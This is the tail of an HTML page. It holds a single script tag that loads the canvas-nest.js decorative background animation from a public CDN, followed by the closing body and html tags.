<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

</body>
</html>
